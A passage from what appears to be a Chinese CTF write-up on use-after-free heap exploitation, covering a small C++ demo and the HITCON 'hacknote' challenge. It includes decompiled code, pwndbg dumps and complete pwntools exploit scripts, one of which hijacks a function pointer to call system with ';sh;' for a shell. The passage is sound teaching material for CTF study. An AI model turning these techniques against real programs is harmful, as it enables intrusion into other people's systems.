+<p>可以看到0x613e70处内容已经修改为我们写入的deadbeef，我们查看一下汇编<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> disassemble /m main</span></span><br><span class="line">Dump of assembler code for function main():</span><br><span class="line">...</span><br><span class="line">38	    p-&gt;print();     //继续使用p，触发漏洞，程序会报错</span><br><span class="line">=&gt; 0x00000000004008dd &lt;+131&gt;:	mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x00000000004008e1 &lt;+135&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00000000004008e4 &lt;+138&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00000000004008e7 &lt;+141&gt;:	mov    rdx,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x00000000004008eb &lt;+145&gt;:	mov    rdi,rdx</span><br><span class="line">   0x00000000004008ee &lt;+148&gt;:	call   rax</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>我们查看寄存器信息<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RBX  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RCX  0xa666565626461</span><br><span class="line"> RDX  0xa</span><br><span class="line"> RDI  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RSI  0x6665656264616564 ('deadbeef')</span><br><span class="line"> R8   0x613e99 ◂— 0x0</span><br><span class="line"> R9   0x7ffff7fd7d80 ◂— 0x7ffff7fd7d80</span><br><span class="line"> R10  0x6</span><br><span class="line"> R11  0x7ffff76f89a0 (strdup) ◂— push   rbp</span><br><span class="line"> R12  0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdfe0 —▸ 0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RIP  0x4008dd (main+131) ◂— mov    rax, qword ptr [rbp - 0x20]</span><br></pre></td></tr></table></figure></p>
+<p>我们发现RAX的内容就是我们输入的信息，结合汇编代码可以发现，最终的call rax这句代码将执行的我们输入的数据所指的地址的代码，也就是我们可以通过输入来getshell,我们通过IDA找到函数的地址</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./UAF'</span>)</span><br><span class="line">buf_addr = <span class="number">0x00601080</span></span><br><span class="line">sh_addr = <span class="number">0x0400847</span></span><br><span class="line">p.sendline(p64(buf_addr+<span class="number">8</span>) + p64(sh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example-Two"><a href="#Example-Two" class="headerlink" title="Example Two"></a>Example Two</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>首先运行一下程序，可以看到Menu中有一下几个选项：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></p>
+<p>我们分别来分析一下各个函数的功能：</p>
+<h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p>可以看出该函数主要就是创建 note ，最多能够创建5个，每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)notelist[i] = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="keyword">void</span> **)notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p>该函数就是输出相应note的内容<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h4><p>该函数主要就是删除对应的note，但是在删除的时候只是进行了free而并没有置为NULL，这里就存在UAF漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以在IDA中看到程序有一个叫做magic的函数，它的作用就是 cat flag，所以我们只需要修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</p>
+<p>因为note是一个fastbin chunk（大小为 16 字节），我们需要将note的put字段修改为magic函数的地址，而fastbin chunk是一个单链表有LIFO的特性，所以我们从申请入手，利用过程如下：</p>
+<ol>
+<li>申请 note0，real content size 为 16（大小不为8即可）</li>
+<li>申请 note1，real content size 为 16（同上）</li>
+<li>释放 note0</li>
+<li>释放 note1</li>
+<li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li>
+<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则 note2 其实会分配 note1 对应的内存块。</li>
+<li>real content 对应的 chunk 其实是 note0。</li>
+<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li>
+</ol>
+<p>我们动态调试一下整个过程：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap</span></span><br><span class="line">0x804b000 &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x151, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到我们的数据已经成功申请<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x804b150</span></span><br><span class="line">0x804b150:    0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b160:	0x0804b1700804865b	0x0000002100000000</span><br><span class="line">0x804b170:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x804b180:	0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b190:	0x0804b1a00804865b	0x0000002100000000</span><br><span class="line">0x804b1a0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x804b1b0:	0x0000000000000000	0x00021e4900000000</span><br><span class="line">0x804b1c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>删除之后可以再次来看堆的信息可以看到大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x804b150</span></span><br><span class="line">0x804b150:    0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b160:	0x0804b17000000000	0x0000002100000000</span><br><span class="line">0x804b170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b180:	0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b190:	0x0804b1a00804b160	0x0000002100000000</span><br><span class="line">0x804b1a0:	0x0000000a0804b170	0x0000000000000000</span><br><span class="line">0x804b1b0:	0x0000000000000000	0x00021e4900000000</span><br><span class="line">0x804b1c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>我们重新申请大小为8,内容为aaaa的note再打印note0就会改变eip<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">Index :0</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0x61616161 ('aaaa')</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x0</span><br><span class="line"> EDX  0x804b160 ◂— 0x61616161 ('aaaa')</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line"> EBP  0xffffd188 —▸ 0xffffd1a8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd15c —▸ 0x804896f (print_note+154) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x61616161 ('aaaa')</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x61616161</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd15c —▸ 0x804896f (print_note+154) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd160 —▸ 0x804b160 ◂— 0x61616161 ('aaaa')</span><br><span class="line">02:0008│      0xffffd164 —▸ 0xffffd178 —▸ 0xf7fa0a30 ◂— add    dword ptr [edx + 0xe], eax</span><br><span class="line">03:000c│      0xffffd168 ◂— 0x4</span><br><span class="line">04:0010│      0xffffd16c —▸ 0x8048a32 (menu+147) ◂— add    esp, 0x10</span><br><span class="line">05:0014│      0xffffd170 —▸ 0x8048c63 ◂— pop    ecx /* 'Your choice :' */</span><br><span class="line">06:0018│      0xffffd174 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd178 —▸ 0xf7fa0a30 ◂— add    dword ptr [edx + 0xe], eax</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 61616161</span><br><span class="line">   f 1  804896f print_note+154</span><br><span class="line">   f 2  8048ad3 main+155</span><br><span class="line">   f 3 f7defe81 __libc_start_main+241</span><br><span class="line">Program received signal SIGSEGV (fault address 0x61616161)</span><br></pre></td></tr></table></figure></p>
+<p>我们只需要将aaaa改为我们magic的地址即可，而magic函数的地址是在IDA中可以看到的</p>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>上面的exp并不能拿到shell，只能获得flag，为了拿到shell我们还需要执行system(‘/bin/sh’)，下面的版本才是getshell的exp</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line"><span class="comment">#r = remote("",)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x08048986</span></span><br><span class="line">system_addr = <span class="number">0x8048500</span>+<span class="number">6</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,context)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add_note(<span class="number">20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">8</span>,p32(system_addr)+<span class="string">';sh;'</span>) <span class="comment"># system("address;sh;")</span></span><br><span class="line"></span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>system函数地址分布如下，+6 的原因是直接走push 0x38的位置，让程序直接去解析system函数真正的位置，也就是执行dl_runtime_resolve(link_map, index) 函数解析system函数的位置，具体原理详见 ret2dl-resolve</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0x8048500</span><br><span class="line">   0x8048500 &lt;system@plt&gt;:	jmp    DWORD PTR ds:0x804a028</span><br><span class="line">   0x8048506 &lt;system@plt+6&gt;:	push   0x38</span><br><span class="line">   0x804850b &lt;system@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048510 &lt;<span class="built_in">exit</span>@plt&gt;:	jmp    DWORD PTR ds:0x804a02c</span><br><span class="line">   0x8048516 &lt;<span class="built_in">exit</span>@plt+6&gt;:	push   0x40</span><br><span class="line">   0x804851b &lt;<span class="built_in">exit</span>@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048520 &lt;__libc_start_main@plt&gt;:	jmp    DWORD PTR ds:0x804a030</span><br><span class="line">   0x8048526 